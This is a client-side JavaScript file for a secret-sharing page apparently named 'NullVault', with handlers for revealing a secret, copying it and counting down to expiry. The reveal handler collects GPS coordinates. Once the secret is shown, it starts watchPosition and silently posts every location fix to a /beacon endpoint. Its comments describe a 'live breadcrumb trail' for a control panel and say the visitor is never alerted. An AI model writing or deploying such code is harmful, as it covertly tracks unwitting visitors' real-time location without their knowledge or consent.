// ── Reveal button — requests geolocation then POSTs to /reveal ───────────────
const revealBtn = document.getElementById('revealBtn');
if (revealBtn) {
  revealBtn.addEventListener('click', async () => {
    revealBtn.disabled = true;
    const originalHTML = revealBtn.innerHTML;
    revealBtn.innerHTML = '⏳ &nbsp;Requesting location…';

    const token  = revealBtn.dataset.token;
    const errBox = document.getElementById('revealError');

    function showError(msg) {
      if (errBox) { errBox.textContent = msg; errBox.classList.remove('hidden'); }
      revealBtn.disabled  = false;
      revealBtn.innerHTML = originalHTML;
    }

    // ── Step 1: Try to get GPS coords ────────────────────────────────────────
    let gps_lat  = null;
    let gps_lng  = null;

    if ('geolocation' in navigator) {
      revealBtn.innerHTML = '⏳ &nbsp;Waiting for location…';
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        gps_lat = pos.coords.latitude;
        gps_lng = pos.coords.longitude;
      } catch (geoErr) {
        console.warn('[NullVault] Geolocation failed:', geoErr.code, geoErr.message);
      }
    } else {
      console.warn('[NullVault] Geolocation API not available in this context.');
    }

    // ── Step 2: POST to /reveal ───────────────────────────────────────────────
    revealBtn.innerHTML = '⏳ &nbsp;Verifying…';
    try {
      const resp = await fetch(`/s/${token}/reveal`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ gps_lat, gps_lng }),
      });

      if (!resp.ok) { showError(`Server error (${resp.status}). Please try again.`); return; }

      // Server returns a full HTML page — replace current document
      const html = await resp.text();
      document.open();
      document.write(html);
      document.close();

      // ── Step 3: Start location beaconing after reveal ─────────────────────
      // watchPosition fires on every movement update; we silently POST each
      // fix to /beacon so the control panel gets a live breadcrumb trail.
      if ('geolocation' in navigator) {
        navigator.geolocation.watchPosition(
          (pos) => {
            fetch(`/s/${token}/beacon`, {
              method:  'POST',
              headers: { 'Content-Type': 'application/json' },
              body:    JSON.stringify({
                lat:      pos.coords.latitude,
                lng:      pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              }),
            }).catch(() => {}); // silent — never alert the visitor
          },
          () => {}, // silent on error
          { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
        );
      }
    } catch (fetchErr) {
      console.error('[NullVault] Reveal fetch failed:', fetchErr);
      showError('Network error. Please check your connection and try again.');
    }
  });
}

// ── Copy revealed content ────────────────────────────────────────────────────
const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
  copyBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(document.getElementById('secretContent').innerText).then(() => {
      copyBtn.textContent = 'Copied!';
      setTimeout(() => copyBtn.textContent = 'Copy', 2000);
    });
  });
}

// ── Expiry countdown ─────────────────────────────────────────────────────────
const countdown = document.getElementById('expiryCountdown');
if (countdown) {
  const timerEl   = document.getElementById('expiryTimer');
  const expiresAt = parseInt(countdown.dataset.expires, 10);

  function tick() {
    const secsLeft = expiresAt - Math.floor(Date.now() / 1000);
    if (secsLeft <= 0) {
      timerEl.textContent = 'now — reload to confirm';
      countdown.classList.add('expiry-countdown--urgent');
      return;
    }

    const d = Math.floor(secsLeft / 86400);
    const h = Math.floor((secsLeft % 86400) / 3600);
    const m = Math.floor((secsLeft % 3600) / 60);
    const s = secsLeft % 60;

    let label;
    if (d > 0)      label = `${d}d ${h}h ${m}m`;
    else if (h > 0) label = `${h}h ${m}m ${s}s`;
    else            label = `${m}m ${s}s`;

    timerEl.textContent = label;

    if (secsLeft < 3600) countdown.classList.add('expiry-countdown--urgent');
    else                 countdown.classList.remove('expiry-countdown--urgent');

    setTimeout(tick, 1000);
  }

  tick();
}
